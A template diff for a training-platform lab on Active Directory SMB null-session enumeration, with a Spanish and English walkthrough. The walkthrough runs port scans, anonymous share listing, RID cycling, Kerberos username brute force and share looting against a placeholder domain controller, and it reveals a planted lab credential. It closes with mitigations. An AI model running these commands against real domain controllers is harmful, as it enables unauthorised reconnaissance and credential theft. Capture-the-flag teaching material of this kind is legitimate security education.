@@ -1,0 +1,165 @@
+{% extends "base.html" %}
+{% block title %}AD 01 – SMB Enumeration & Null Session – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_smb_enum_obj_desc">El Domain Controller acepta sesiones nulas y tiene la cuenta Guest habilitada: puedes listar recursos y enumerar usuarios sin credenciales. El recurso //DC01/public es legible de forma anónima y contiene la flag, además de las credenciales de servicio que necesitarás en el resto de laboratorios.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/public/flag-ad-01.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% set ad_show_foothold = false %}
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Servicios expuestos por el Domain Controller
+nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}
+
+# Recursos compartidos sin credenciales
+nxc smb {{ ad_dc_ip }} -u '' -p '' --shares</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Reconocimiento del Domain Controller</h3>
+    <p>Los puertos delatan un DC: Kerberos (88), LDAP (389/636), Global Catalog (3268) y SMB (445).</p>
+    <pre>nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}
+
+# El nombre del dominio también sale por SMB
+nxc smb {{ ad_dc_ip }}
+# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})</pre>
+
+    <h3>2 · Sesión nula: listar recursos compartidos</h3>
+    <p>El servidor tiene <code>restrict anonymous = 0</code> y <code>map to guest = Bad User</code>, así que una sesión sin credenciales lista los recursos.</p>
+    <pre># Con netexec (sesión nula y sesión guest)
+nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
+nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --shares
+
+# Con smbclient
+smbclient -N -L //{{ ad_dc_ip }}/
+
+# Con smbmap
+smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
+    <p>Entre los recursos aparece <code>public</code> con permiso de lectura para todos.</p>
+
+    <h3>3 · Enumerar usuarios del dominio sin credenciales</h3>
+    <p>Dos vías clásicas: RID cycling por SMB y fuerza bruta de nombres contra el KDC (que responde distinto para un usuario válido).</p>
+    <pre># RID cycling (enumera SIDs 500-1500 y los traduce a nombres)
+nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute
+impacket-lookupsid '{{ ad_domain }}/guest:@{{ ad_dc_ip }}' 1500
+
+# Enumeración de usuarios contra Kerberos (no necesita credenciales)
+kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt</pre>
+    <p>Guarda la lista de usuarios en <code>users.txt</code>: la vas a reutilizar en los labs de spraying, AS-REP Roasting y Kerberoasting.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute 2>/dev/null \
+  | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' &gt; users.txt
+cat users.txt</pre>
+
+    <h3>4 · Saquear el recurso anónimo</h3>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public
+smb: \&gt; ls
+smb: \&gt; get flag-ad-01.txt
+smb: \&gt; get IT_Onboarding.txt
+smb: \&gt; exit
+
+cat flag-ad-01.txt          # ← flag del laboratorio
+cat IT_Onboarding.txt   # ← credenciales de svc.readonly</pre>
+    <p>O en una sola línea, sin sesión interactiva:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt -' 2&gt;/dev/null
+nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
+
+    <h3>5 · Capturar la flag</h3>
+    <p>La flag está en <code>flag-ad-01.txt</code> del recurso <code>public</code>:</p>
+    <pre>HL{···}</pre>
+    <p>Y <code>IT_Onboarding.txt</code> te entrega el <em>foothold</em> con el que arrancan el resto de laboratorios de esta categoría:</p>
+    <pre>Usuario : svc.readonly
+Password: ReadOnly123!
+
+# Verifícalo:
+nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Deshabilitar el acceso anónimo: <code>RestrictAnonymous = 1</code> y deshabilitar la cuenta Guest.</li>
+      <li>Nunca publicar credenciales en recursos compartidos; usar gMSA o un gestor de secretos.</li>
+      <li>Restringir el listado de recursos y auditar los accesos anónimos (evento 5140).</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">impacket-lookupsid</span> <span class="tools-badge">kerbrute</span> <span class="tools-badge">enum4linux-ng</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Domain Controller recon</h3>
+    <p>The open ports give the DC away: Kerberos (88), LDAP (389/636), Global Catalog (3268) and SMB (445).</p>
+    <pre>nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}
+
+# SMB also leaks the domain name
+nxc smb {{ ad_dc_ip }}
+# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})</pre>
+
+    <h3>2 · Null session: list the shares</h3>
+    <p>The server ships <code>restrict anonymous = 0</code> and <code>map to guest = Bad User</code>, so a credential-less session lists the shares.</p>
+    <pre># With netexec (null and guest sessions)
+nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
+nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --shares
+
+# With smbclient
+smbclient -N -L //{{ ad_dc_ip }}/
+
+# With smbmap
+smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
+    <p>A <code>public</code> share shows up, readable by everyone.</p>
+
+    <h3>3 · Enumerate domain users without credentials</h3>
+    <p>Two classic paths: SMB RID cycling and username brute force against the KDC (which answers differently for a valid user).</p>
+    <pre># RID cycling (walks SIDs 500-1500 and resolves them to names)
+nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute
+impacket-lookupsid '{{ ad_domain }}/guest:@{{ ad_dc_ip }}' 1500
+
+# Kerberos user enumeration (no credentials needed)
+kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt</pre>
+    <p>Save the user list to <code>users.txt</code>: you will reuse it in the spraying, AS-REP Roasting and Kerberoasting labs.</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute 2>/dev/null \
+  | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' &gt; users.txt
+cat users.txt</pre>
+
+    <h3>4 · Loot the anonymous share</h3>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public
+smb: \&gt; ls
+smb: \&gt; get flag-ad-01.txt
+smb: \&gt; get IT_Onboarding.txt
+smb: \&gt; exit
+
+cat flag-ad-01.txt          # ← lab flag
+cat IT_Onboarding.txt   # ← svc.readonly credentials</pre>
+    <p>Or as a one-liner, no interactive session:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get flag-ad-01.txt -' 2&gt;/dev/null
+nxc smb {{ ad_dc_ip }} -u '' -p '' --spider public --regex .</pre>
+
+    <h3>5 · Capture the flag</h3>
+    <p>The flag lives in <code>flag-ad-01.txt</code> inside the <code>public</code> share:</p>
+    <pre>HL{···}</pre>
+    <p>And <code>IT_Onboarding.txt</code> hands you the foothold every other lab in this category starts from:</p>
+    <pre>User    : svc.readonly
+Password: ReadOnly123!
+
+# Verify it:
+nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!'</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Disable anonymous access: <code>RestrictAnonymous = 1</code> and disable the Guest account.</li>
+      <li>Never publish credentials on file shares; use gMSA or a secret manager.</li>
+      <li>Restrict share enumeration and audit anonymous access (event 5140).</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">impacket-lookupsid</span> <span class="tools-badge">kerbrute</span> <span class="tools-badge">enum4linux-ng</span></div>
+  </div>
+</div>
+{% endblock %}
